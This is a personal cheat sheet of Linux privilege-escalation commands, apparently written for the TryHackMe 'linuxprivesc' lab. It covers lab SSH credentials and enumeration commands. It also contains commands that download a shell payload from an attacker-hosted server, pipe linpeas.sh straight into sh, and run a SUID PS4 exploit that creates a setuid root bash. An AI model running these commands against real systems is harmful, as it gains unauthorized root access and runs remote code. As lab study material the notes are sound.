# 1. TEST SETUP/ENVIRONMENT

## TRYHACKME
```
https://tryhackme.com/room/linuxprivesc
ssh user@1.1.1.1
ssh -oHostKeyAlgorithms=+ssh-dss user@1.1.1.1
pass:password321
```

## METASPLOITABLE


## FILE TRANSFER - WEB BASED
```
cd /var/www/html/priv_esc
python3 -m http.server
wget http://10.18.5.137:8000/shell.elf
```

## FILE TRANSFER - SMB BASED



# 2. MANUAL ENUMERATION 

## USERS
```
whoami
id
cat /etc/passwd
```

## HOSTNAME
```
hostname
```

## OS VERSION & ARCHITECTURE
```
cat /etc/issue
cat /etc/~release
uname
uname -a
```

## RUNNING PROCESS & SERVICES
```
ps 
ps -aux
pgrep mysqld
```

## NETWORK INFORMATION 
```
ifconfig
ifconfig -a
ip a
route
routel
/sbin/route
netstat
ss -anp
```

## FIREWALL STATUS AND RULES
```
/etc/iptables
/sbin/iptables
iptables -L -v
```

## SCHEDULED TASKS
```
ls -lah /etc/cron*
cat /etc/crontab 
```

## INSTALLED APPS & PATCH LEVELS
```
dpkg –l
dpkg -l | grep whois
```

## READABLE/WRITABLE FILES AND DIRECTORIES
```
find / -writeable -type d 2>/dev/null
```

## UNMOUNTED DISKS
```
mount
cat /etc/fstab
/bin/lsblk
```

## DEVICE DRIVERS AND KERNEL MODULES
```
/sbin/modinfo ip_tables
lsmod
```

## BINARIES THAT AUTO ELEVATE
```
find / -perm -u=s -type f 2>/dev/null
```

# 3. AUTOMATED ENUMERATION 

## UNIX-PRIVESC-CHECK
```
https://pentestmonkey.net/tools/audit/unix-privesc-check
sudo wget https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
sudo tar -xf unix-privesc-check-1.4.tar.gz
wget http://10.18.5.137:8000/unix-privesc-check-1.4/unix-privesc-check
chmod 777 unix-privesc-check
./unix-privesc-check
./unix-privesc-check standard
./unix-privesc-check detailed
./unix-privesc-check standard > output.txt
cat output.txt
```

## LINPEAS
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## LINUX PRIVILEGE CHECKER


# 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 



## CATEGORY "SUID / SGID EXECUTEABLES" - ABUSING SHELL FEATURES 2

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

/tmp/rootbash -p

rm /tmp/rootbash

exit
```
